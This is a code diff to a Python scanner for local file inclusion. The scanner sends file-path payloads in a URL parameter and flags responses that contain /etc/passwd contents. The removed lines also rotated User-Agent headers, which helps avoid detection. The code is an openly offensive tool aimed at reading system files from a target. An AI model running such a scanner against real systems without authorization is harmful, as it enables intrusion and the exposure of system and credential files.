@@ -1,24 +1,19 @@
+import os
 import requests
-import random
 
-def load_payloads(path="core/payloads/lfi_payloads.txt"):
-    with open(path, 'r') as f:
-        return [line.strip() for line in f if line.strip()]
+def load_payloads():
+    base = os.path.dirname(os.path.abspath(__file__))
+    with open(os.path.join(base, "payloads", "lfi_payloads.txt"), "r") as f:
+        return [p.strip() for p in f.readlines() if p.strip()]
 
-def get_random_user_agent():
-    with open("data/user_agents.txt", "r") as f:
-        return random.choice(f.read().splitlines())
-
-def scan_lfi(target_url, param="file", logger=print):
+def scan_lfi(url, param, logger=print):
     payloads = load_payloads()
-    headers = {"User-Agent": get_random_user_agent()}
-    logger(f"[>] Scanning {target_url} for LFI on parameter '{param}'")
-
+    logger(f"[LFI] Loaded {len(payloads)} payloads")
     for payload in payloads:
-        test_url = f"{target_url}?{param}={payload}"
+        full_url = f"{url}?{param}={payload}"
         try:
-            r = requests.get(test_url, headers=headers, timeout=8)
-            if "root:x" in r.text or "etc/passwd" in r.text:
-                logger(f"[!!] Possible LFI found with payload: {payload}")
+            r = requests.get(full_url, timeout=5)
+            if "root:x" in r.text or "bin/bash" in r.text:
+                logger(f"[+] LFI success: {payload}")
         except Exception as e:
-            logger(f"[X] Error with payload {payload}: {e}")
+            logger(f"[!] Error: {e}")
